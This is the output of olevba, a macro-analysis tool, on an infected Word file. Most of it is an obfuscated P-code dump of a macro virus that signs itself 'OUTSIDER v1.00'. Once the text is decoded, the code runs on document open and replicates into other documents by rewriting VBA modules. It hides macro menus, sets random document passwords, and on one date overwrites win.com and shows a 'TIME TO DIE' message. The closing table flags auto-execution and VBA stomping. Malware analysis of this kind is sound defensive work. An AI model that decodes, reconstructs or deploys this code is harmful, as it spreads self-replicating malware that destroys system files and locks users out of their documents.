' 	QuoteRem 0x0000 0x001A "Qbjmi^qbp%.&+P^sba
' :
' Qorb'"
' Line #151:
' 	QuoteRem 0x0000 0x0014 ">aaFkp+Rkil^a
' C^ipb'"
' Line #152:
' 	QuoteRem 0x0000 0x000D "@^ii
' @ib^o>A'"
' Line #153:
' 	QuoteRem 0x0000 0x001E "@ljj^ka?^op%Pq^ka^oa&+Obpbq'"
' Line #154:
' 	QuoteRem 0x0000 0x0029 ">mmif`^qflk+PeltSfpr^i?^pf`Bafqlo
' :
' Qorb'"
' Line #155:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #156:
' 	QuoteRem 0x0000 0x0011 "Pr_
' QllipJ^`ol%&'"
' Line #157:
' 	QuoteRem 0x0000 0x001A "Qbjmi^qbp%.&+P^sba
' :
' Qorb'"
' Line #158:
' 	QuoteRem 0x0000 0x0014 ">aaFkp+Rkil^a
' C^ipb'"
' Line #159:
' 	QuoteRem 0x0000 0x000D "@^ii
' @ib^o>A'"
' Line #160:
' 	QuoteRem 0x0000 0x001E "@ljj^ka?^op%Pq^ka^oa&+Obpbq'"
' Line #161:
' 	QuoteRem 0x0000 0x0021 "Af^ildp%taAf^ildQllipJ^`ol&+Pelt'"
' Line #162:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #163:
' 	QuoteRem 0x0000 0x0013 "Pr_
' QllipLmqflkp%&'"
' Line #164:
' 	QuoteRem 0x0000 0x0017 "Afj
' Ob^iM^qe
' >p
' Pqofkd'"
' Line #165:
' 	QuoteRem 0x0000 0x000E "Ob^iM^qe
' :
' '"
' Line #166:
' 	QuoteRem 0x0000 0x0079 "Ob^iM^qe
' :
' Pvpqbj+Mofs^qbMolcfibPqofkd%)
' EHBV\@ROOBKQ\RPBOYPlcqt^obYJf`olplcqYLccf`bY5+-YTloaYLmqflkp)
' MOLDO>JAFO&'"
' Line #167:
' 	QuoteRem 0x0000 0x0021 "Ob^iM^qe
' :
' Ob^iM^qe
' #
' YPq^oqRm'"
' Line #168:
' 	QuoteRem 0x0000 0x007B "Pvpqbj+Mofs^qbMolcfibPqofkd%)
' EHBV\@ROOBKQ\RPBOYPlcqt^obYJf`olplcqYLccf`bY5+-YTloaYLmqflkp)
' PQ>OQRM*M>QE&
' :
' Ob^iM^qe'"
' Line #169:
' 	QuoteRem 0x0000 0x003B "Fc
' Af^ildp%taAf^ildQllipLmqflkp&+Pelt
' :
' -
' Lo
' *.
' Lo
' */
' Qebk'"
' Line #170:
' 	QuoteRem 0x0000 0x0090 "Pvpqbj+Mofs^qbMolcfibPqofkd%)
' EHBV\@ROOBKQ\RPBOYPlcqt^obYJf`olplcqYLccf`bY5+-YTloaYLmqflkp)
' PQ>OQRM*M>QE&
' :
' Bksfolk%TfkAfo&
' #
' YPVPQBJ'"
' Line #171:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #172:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #173:
' 	QuoteRem 0x0000 0x0010 "Pr_
' CfibMofkq%&'"
' Line #174:
' 	QuoteRem 0x0000 0x0030 "Fc
' Af^ildp%taAf^ildCfibMofkq&+Afpmi^v
' :
' *.
' Qebk'"
' Line #175:
' 	QuoteRem 0x0000 0x001A "@^ii
' Mofkq@roobkqAl`rjbkq'"
' Line #176:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #177:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #178:
' 	QuoteRem 0x0000 0x001B "Pr_
' Mofkq@roobkqAl`rjbkq%&'"
' Line #179:
' 	QuoteRem 0x0000 0x0015 "Lk
' Boolo
' Obprjb
' Kbuq'"
' Line #180:
' 	QuoteRem 0x0000 0x0017 "Afj
' KlMofkq
' >p
' Fkqbdbo'"
' Line #181:
' 	QuoteRem 0x0000 0x000A "O^kaljfwb'"
' Line #182:
' 	QuoteRem 0x0000 0x001D "KlMofkq
' :
' Fkq%%Oka
' '
' 0&
' (
' .&'"
' Line #183:
' 	QuoteRem 0x0000 0x0014 "Fc
' KlMofkq
' :
' 0
' Qebk'"
' Line #184:
' 	QuoteRem 0x0000 0x0068 "Jpd?lu
' Ìíåêïâí
' 
' #
' >mmif`^qflk+>`qfsbMofkqbo
' #
' 
' êâ
' êÝæáâê)
' s_LHLkiv
' (
' s_Bu`i^j^qflk)
' ËõåÞçÝ
' ìâôÝïå'"
' Line #185:
' 	QuoteRem 0x0000 0x0009 "Bufq
' Pr_'"
' Line #186:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #187:
' 	QuoteRem 0x0000 0x0018 ">`qfsbAl`rjbkq+MofkqLrq'"
' Line #188:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #189:
' 	QuoteRem 0x0000 0x000E "Pr_
' @ib^o>A%&'"
' Line #190:
' 	QuoteRem 0x0000 0x0015 "Lk
' Boolo
' Obprjb
' Kbuq'"
' Line #191:
' 	QuoteRem 0x0000 0x001B "Afj
' >AI@lrkq)
' f
' >p
' Fkqbdbo'"
' Line #192:
' 	QuoteRem 0x0000 0x0047 "Pbq
' >A@labJlarib
' :
' >`qfsbAl`rjbkq+S?Molgb`q+S?@ljmlkbkqp%.&+@labJlarib'"
' Line #193:
' 	QuoteRem 0x0000 0x0026 "Fc
' >A@labJlarib+@lrkqLcIfkbp
' ;
' -
' Qebk'"
' Line #194:
' 	QuoteRem 0x0000 0x0025 ">AI@lrkq
' :
' >A@labJlarib+@lrkqLcIfkbp'"
' Line #195:
' 	QuoteRem 0x0000 0x0025 ">A@labJlarib+AbibqbIfkbp
' .)
' >AI@lrkq'"
' Line #196:
' 	QuoteRem 0x0000 0x0010 "Clo
' f
' :
' .
' Ql
' /-'"
' Line #197:
' 	QuoteRem 0x0000 0x0020 ">A@labJlarib+FkpboqIfkbp
' .)
' 
' '"
' Line #198:
' 	QuoteRem 0x0000 0x001E ">A@labJlarib+AbibqbIfkbp
' .)
' .'"
' Line #199:
' 	QuoteRem 0x0000 0x0007 "Kbuq
' f'"
' Line #200:
' 	QuoteRem 0x0000 0x001C ">`qfsbAl`rjbkq+P^sba
' :
' Qorb'"
' Line #201:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #202:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #203:
' 	QuoteRem 0x0000 0x000F "Pr_
' Lrqpfabo%&'"
' Line #204:
' 	QuoteRem 0x0000 0x002D "Fc
' %A^v%Klt&
' :
' 2&
' >ka
' %Jlkqe%Klt&
' :
' ./&
' Qebk'"
' Line #205:
' 	QuoteRem 0x0000 0x0016 "Afj
' ?rccbo
' >p
' S^of^kq'"
' Line #206:
' 	QuoteRem 0x0000 0x0014 "Afj
' ?rccbo.
' >p
' ?vqb'"
' Line #207:
' 	QuoteRem 0x0000 0x003D "?rccbo
' :
' >oo^v%.51)
' .3)
' 0)
' .52)
' -)
' .)
' 2.)
' /.-)
' /-2)
' .6)
' .62&'"
' Line #208:
' 	QuoteRem 0x0000 0x0035 "Lmbk
' Bksfolk%TfkAfo&
' #
' Ytfk+`lj
' Clo
' ?fk^ov
' >p
'  .'"
' Line #209:
' 	QuoteRem 0x0000 0x0010 "Clo
' f
' :
' .
' Ql
' ..'"
' Line #210:
' 	QuoteRem 0x0000 0x0018 "?rccbo.
' :
' ?rccbo%f
' *
' .&'"
' Line #211:
' 	QuoteRem 0x0000 0x0013 "Mrq
'  .)
' f)
' ?rccbo.'"
' Line #212:
' 	QuoteRem 0x0000 0x0007 "Kbuq
' f'"
' Line #213:
' 	QuoteRem 0x0000 0x0009 "@ilpb
'  .'"
' Line #214:
' 	QuoteRem 0x0000 0x0069 "Jpd?lu
' Moljmq7:Qfjb
' #
' 
' *
' QfJB
' QL
' AfB
' 
' 
' #
' @eo%.0&
' #
' @eo%.0&
' #
' XLRQPfABOZ)
' Qfqib7:LRQPfABO$P
' JBPP>DB'"
' Line #215:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #216:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #217:
' 	QuoteRem 0x0000 0x0012 "Pr_
' PbqM^pptloa%&'"
' Line #218:
' 	QuoteRem 0x0000 0x0011 "Afj
' f
' >p
' Fkqbdbo'"
' Line #219:
' 	QuoteRem 0x0000 0x0017 "Afj
' M^pp`lab
' >p
' Pqofkd'"
' Line #220:
' 	QuoteRem 0x0000 0x000A "O^kaljfwb'"
' Line #221:
' 	QuoteRem 0x0000 0x000F "Clo
' f
' :
' .
' Ql
' 3'"
' Line #222:
' 	QuoteRem 0x0000 0x0018 "O@
' :
' Fkq%%6
' '
' Oka&
' (
' -&'"
' Line #223:
' 	QuoteRem 0x0000 0x0019 "M^pp`lab
' :
' M^pp`lab
' #
' O@'"
' Line #224:
' 	QuoteRem 0x0000 0x0007 "Kbuq
' f'"
' Line #225:
' 	QuoteRem 0x0000 0x0023 ">`qfsbAl`rjbkq+M^pptloa
' :
' M^pp`lab'"
' Line #226:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #227:
' 	QuoteRem 0x0000 0x000F "Pr_
' Fkcb`q>A%&'"
' Line #228:
' 	QuoteRem 0x0000 0x001B "Afj
' >AI@lrkq)
' f
' >p
' Fkqbdbo'"
' Line #229:
' 	QuoteRem 0x0000 0x0047 "Pbq
' >A@labJlarib
' :
' >`qfsbAl`rjbkq+S?Molgb`q+S?@ljmlkbkqp%.&+@labJlarib'"
' Line #230:
' 	QuoteRem 0x0000 0x0025 ">AI@lrkq
' :
' >A@labJlarib+@lrkqLcIfkbp'"
' Line #231:
' 	QuoteRem 0x0000 0x0034 "Fc
' >A@labJlarib+Ifkbp%/)
' .&
' :
' Pr_
' >rqlLmbk%&
' Qebk'"
' Line #232:
' 	QuoteRem 0x0000 0x0009 "Bufq
' Pr_'"
' Line #233:
' 	QuoteRem 0x0000 0x0005 "Bipb'"
' Line #234:
' 	QuoteRem 0x0000 0x0025 ">A@labJlarib+AbibqbIfkbp
' .)
' >AI@lrkq'"
' Line #235:
' 	QuoteRem 0x0000 0x0021 ">A@labJlarib+>aaColjPqofkd
' @\A@/'"
' Line #236:
' 	QuoteRem 0x0000 0x0007 "Bka
' Fc'"
' Line #237:
' 	QuoteRem 0x0000 0x001A "Qbjmi^qbp%.&+P^sba
' :
' Qorb'"
' Line #238:
' 	QuoteRem 0x0000 0x0008 "Bka
' Pr_'"
' Line #239:
' 	QuoteRem 0x0000 0x0011 "$LRQPfABO
' s.+--$'"
' Line #240:
' 	QuoteRem 0x0000 0x0016 "$B^pq*H^w^hepq^k)
' RH$'"
' Line #241:
' 	QuoteRem 0x0000 0x0021 "$.-
' g^kr^ov
' /--.
' vb^o+
' ..7--
' ^j$'"
' Line #242:
' 	QuoteRem 0x0000 0x0024 "$Kbt
' bk`ovmq
' ^ka
' pqb^iqe
' ^idlofqej$'"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

